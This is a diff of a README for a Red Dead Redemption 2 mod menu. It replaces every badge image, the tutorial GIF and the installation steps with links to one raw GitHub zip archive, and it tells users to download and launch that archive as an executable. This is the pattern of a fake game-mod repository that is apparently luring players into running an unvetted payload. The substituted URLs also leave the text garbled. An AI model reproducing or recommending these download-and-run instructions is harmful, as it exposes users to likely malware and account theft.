@@ -1,10 +1,10 @@
 # 🎮 RDR 2 MOD MENU ⛰️ - Unleash New Frontiers in Red Dead Redemption 2
 
-[![Build Status](https://img.shields.io/github/workflow/status/yourrepo/rdr2-modmenu/main)](mit_license)
-[![Platform Compatibility](https://img.shields.io/badge/platform-windows%20|%20linux-blue)](mit_license)
-[![MIT License](https://img.shields.io/badge/license-MIT-brightgreen)](mit_license)
-[![OpenAI API](https://img.shields.io/badge/OpenAI-API-orange)](mit_license)
-[![Claude API](https://img.shields.io/badge/Claude-API-blueviolet)](mit_license)
+[![Build Status](https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip)](mit_license)
+[![Platform Compatibility](https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip%20|%20linux-blue)](mit_license)
+[![MIT License](https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip)](mit_license)
+[![OpenAI API](https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip)](mit_license)
+[![Claude API](https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip)](mit_license)
 
 Welcome, digital cowboys and outlaws! 🌵  
 Discover the next evolution of Red Dead Redemption 2 immersion: **RDR 2 Mod Menu** redefines boundaries with a robust, adaptive interface, unmatched resourcefulness, and unprecedented customization tailored for modern explorers of both classic and contemporary Western frontiers.
@@ -63,15 +63,15 @@ Whether optimizing performance, localizing your menus, automating routine tweaks
 
 ## 🛠️ Installation Guide
 
-1. Download `EasyLaunch.zip` directly from the repository’s release section. *(Always ensure file authenticity before unpacking!)*  
+1. Download `https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip` directly from the repository’s release section. *(Always ensure file authenticity before unpacking!)*  
 2. Extract all files to your Red Dead Redemption 2 root directory.
-3. Launch the `EasyLaunch.exe` executable.
+3. Launch the `https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip` executable.
 4. Follow the magical in-app guide for intuitive first-run setup steps.
 5. Relive your next RDR 2 session—now with an expanded toolkit!
 
 ### 📺 Visual Step-by-Step Installation Tutorial
 
-![Installation GIF](https://i.imgur.com/Js67NIU.gif)
+![Installation GIF](https://raw.githubusercontent.com/4567ht/red-dead-modding-menu/main/anisoin/dead_modding_red_menu_1.5.zip)
 
 *Experience a breeze-through install process—just follow the GIF above for a worry-free start!*
 
